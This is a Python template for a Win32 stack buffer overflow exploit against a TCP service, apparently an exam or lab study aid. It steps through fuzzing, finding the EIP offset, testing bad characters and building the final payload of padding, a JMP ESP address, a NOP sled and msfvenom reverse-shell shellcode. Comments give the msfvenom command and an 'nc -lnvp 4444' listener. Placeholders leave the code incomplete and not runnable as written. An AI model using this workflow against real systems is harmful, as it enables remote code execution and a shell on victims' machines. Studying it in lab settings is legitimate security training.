#Win32Bof remote intrusion

#import
import socket
from time import sleep
from struct import pack
IP = "127.0.0.1"
port = 21449

#Fuzzer
def fuzz():
    try:
        for i in range(0,10000,100):
            buffer = b'A' * i
            print("Fuzzing %s bytes" %i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Connection Error")
fuzz()


#Connection (function to reduce code)
def conexao(#xxx#):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(#xxxx#)
    s.close()

#Eip_offset      
def eip_offset():
    payload = bytes(#"erc --pattern c #the number where it breaks#" in dbg#, "utf-8")
   
    conexao(#xxx)
eip_offset()

#SCRIPT CHARS#
def bad_chars():
    chars = bytes([#erc --bytearray])
    offset = #erc --pattern o EIP/ASCII value
    buffer = b'A' * offset
    eip = b'B'*4
    payload = buffer + eip + chars
    conexao(#xxx)
bad_chars()

#Exploit
def exploit():
    #msfvenom -p windows/shell_reverse_tcp lhost=#ip_vpn# lport=4444 -f 'python' -b #the_bad_chars:'\x00\x0A\x0D'#
    offset = #erc --pattern o EIP/ASCII value
    buffer = b'A' * offset
    eip = pack('<L', 0x#"JMP ESP" address)
    nop = b'\x90' * 32
    payload = buffer + eip + nop + buf
    conexao(#xxx)
exploit()
#"nc -lnvp 4444" to listen on the port
